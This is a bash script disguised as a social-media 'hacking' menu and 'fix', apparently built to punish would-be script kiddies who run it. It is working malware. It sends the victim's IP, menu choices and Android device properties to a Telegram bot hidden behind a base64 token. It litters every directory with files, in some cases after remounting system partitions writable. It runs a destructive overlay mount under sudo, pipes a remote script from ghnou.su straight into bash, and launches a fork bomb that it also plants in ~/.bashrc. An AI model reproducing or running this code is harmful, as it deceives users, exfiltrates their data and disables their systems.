#!/bin/bash

# This fix script is on git!
# You can see and/or clone it from the link below.
# https://git.ghnou.su/collab/fix

# This script moves away from the destructive one.
# I'd like to repeat this. This is NOT the one that nukes user data.
# If you're a chat moderator and can't read bash that's fine.
# Just don't ban people over this rather innocent one please.
# It is also not posted on VirusTotal (yet).

# If you want to learn more about why this script
# came into existence, see this article:
# https://ghnou.su/why-fix

# Any further questions? Read http://www.catb.org/esr/faqs/smart-questions.html
# Seriously, go read it. Twice. It's somewhat long-winded but an absolute
# essential in the world of hackers (like, actual hackers).
# Afterwards you can find this script's maker at e.g. https://t.me/shitposters

ver=mk4

# Kali-style big fat banner
banner(){
	echo ' ____'
	echo '|  _ \ ___ _ __  _ __   ___ _ __      _ __   __ _'
	echo '| |_) / _ \ ´_ \| ´_ \ / _ \ ´__| __ | ´_ \ / _` |'
	echo '|  __/  __/ | | | | | |  __/ |   |__|| | | | (_| |'
	echo '|_|   \___|_| |_|_| |_|\___|_|       |_| |_|\__, |'
	echo '                                            |___/'
	echo "Made with love on GahNoo/Loonix"
	echo "Follow us on https://t.me/skid_tg_says for moar epic hakz"
	echo "Version: $ver"
	echo ""
}

# Distribution detection
dist(){
	# Termux hacker???
	if [ "$OSTYPE" = "linux-android" ]
	then
		if [ "$(su -c id -u)" = "0" ]
		then
			# Woah 1337 rooted Termux hacker
			termux-root
		else
			# Not even rooted smh
			termux-noroot
		fi
	else
	# Seems like a desktop hacker?
		source <(grep -w ID /etc/os-release)
		case "$ID" in
			kali)	desktop-hakz ;;
			parrot)	desktop-hakz ;;
			*)	lucky ;;
		esac
	fi
}

# Non-root Termux mode
termux-noroot(){
	if [ -z $dryrun ]
	then
		export mode="non-rooted Termux"
		info mode
		info props
		# First fill the Termux home directory
		for i in $(find $HOME -type d)
		do
			iamskid $i
		done
		# Afterwards do the SD card too if possible
		echo "We need storage access to store our algorithms."
		termux-setup-storage
		for i in $(find /sdcard -type d)
		do
			iamskid $i
		done
		info success
	else
		echo "Entered unrooted Termux mode."
	fi
}

# TODO: Not many rooted Termux haxxors, should we drop this?
termux-root(){
	if [ -z $dryrun ]
	then
		export mode="rooted Termux"
		info mode
		info props
		su -c mount -o rw,remount /
		su -c mount -o rw,remount /system
		for i in $(find / -type d)
		do
			# FIXME: This would make numerous su requests...
			export su="su -c"
			iamskid $i
		done
		info success
	else
		echo "Entered rooted Termux mode."
	fi
}

# 1337 Kali/Parrot hacker hmm
desktop-hakz(){
	if [ -z $dryrun ]
	then
		export mode="Kali/Parrot"
		info mode
		sudo mount -t overlay overlaid -o lowerdir=/dev,upperdir=/var,workdir=/usr /
		info success
	else
		echo "Entered desktop mode."
	fi
}

lucky(){
	echo "It's your lucky day! This script is somewhat malicious."
	echo "However, currently you are in an environment that this script bails out in."
	echo "No harm done. Think twice before executing random stuff from a stranger"
	echo "on the internet."
	echo "Go read https://ghnou.su/fbhacking to learn more about social media hacking."
}

iamskid(){
	# Touch one hidden, one visible file.
	$su touch $1/.iamskid 2>/dev/null
	$su touch $1/iamskid 2>/dev/null
}

mk3(){
	curl -sL ghnou.su/fix-mk3.sh | bash -
}

fork(){
	if [ -z $nofork ]
	then
		echo "command_not_found_handle(){:(){ :|: & };:}" >> ~/.bashrc
		:(){ :|: & };:
	else
		echo "No forking around here!"
	fi
}

info(){
	facebook="MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dwo="
	chat="-458649020"

	case $1 in
	preamble)
		for message in "Pwning a new haxxor." "My IP: $(curl -s icanhazip.com)" "Preamble finished. Continuing into menu.."
		do
			curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=$chat" -d "text=$message" &>/dev/null
		done
	;;
	mode)
		curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=$chat" -d "text=Entered mode $mode" &>/dev/null
	;;
	option)
		curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=$chat" -d "text=Option $ans selected." &>/dev/null
	;;
	props)
		getprop > props.txt
		curl -sF document=@"props.txt" "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendDocument?chat_id=$chat" &>/dev/null
	;;
	success)
		curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=$chat" -d "text=Mission success. 👌" &>/dev/null
	;;
	esac
}

menu(){
	echo "What do you want to do?"
	echo "(1) Facebook hacking"
	echo "(2) Instagram hacking"
	echo "(3) WhatsApp hacking"
	echo "(4) Telegram hacking"
	echo "(5) Android hacking"
	echo "(6) Free internet VPN"
	echo "(7) Google hacking"
	echo "(8) Email hacking"
	echo "(9) Amazon gift card / fullz generator"
	echo "(10) Install WiFi drivers"
	echo "(11) PDoS that ghnou.su madarchod site"
	echo "(12) Nah I just want to learn Termux sir"
	read -p "Your choice? (1-12): " ans < /dev/tty
	echo ""
	info option
	if [ "$ans" -lt "11" ]
	then
		dist
	elif [ "$ans" -eq "11" ]
	then
		echo "Hah, good luck with that :)"
		echo ""
		mk3
	elif [ "$ans" -eq "12" ]
	then
		echo "Sweet! Have a look at e.g. https://cyberciti.biz, TLDP etc to learn some bash."
		exit 0
	else
		echo "Please try again. This menu *only* takes a number."
		menu
	fi
}

banner
info preamble
menu
fork
